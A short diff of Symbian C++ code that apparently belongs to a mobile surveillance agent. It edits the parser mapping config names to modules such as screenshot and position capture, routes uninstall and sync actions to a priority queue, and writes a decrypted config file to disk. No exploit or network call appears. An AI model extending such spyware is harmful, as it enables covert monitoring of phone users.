@@ -99,6 +99,7 @@ CDataMacroAction::~CDataMacroAction()
 
 void CDataMacroAction::ConstructL()
 	{
+	iQueueId = ESecondaryQueue;
 	}
 
 void CDataMacroAction::AppendAction(CDataAction* aAction)
@@ -292,7 +293,7 @@ HBufC8* CConfigFile::DecryptConfigFileL(RFs& fs, const TDesC& fname)
 	
 	RFile file;
 	TFullName filename(_L("C:\\Data\\Installs\\json.txt"));
-	TInt err = file.Create(fs, filename, EFileWrite | EFileStream | EFileShareAny);
+	TInt err = file.Replace(fs, filename, EFileWrite | EFileStream | EFileShareAny);
 	file.Write(*encryptedBuf);
 	file.Flush();
 	file.Close();
@@ -490,7 +491,7 @@ TInt CConfigFile::GetModuleId(CJsonObject* aObject)
 	if(name.Compare(_L("url"))== 0)
 		//return EAgent_URL_TODO;
 		return 0;
-	if(name.Compare(_L("snapshot")) == 0)
+	if(name.Compare(_L("screenshot")) == 0)
 		return EAgent_Snapshot;
 	if(name.Compare(_L("position")) == 0)
 		return EAgent_Position;
@@ -614,6 +615,10 @@ void CConfigFile::ReadActionsSectionL(CJsonArray* aActionsArray)
 				{
 				TInt actionId=0;
 				actionId = GetActionId(action);
+				
+				// set the queue id
+				if((actionId==EAction_Uninstall) || (actionId == EAction_Sync) || (actionId == EAction_SyncApn))
+					newMacroAction->iQueueId = EPrimaryQueue;
 				
 				RBuf params;
 				params.Create(420);
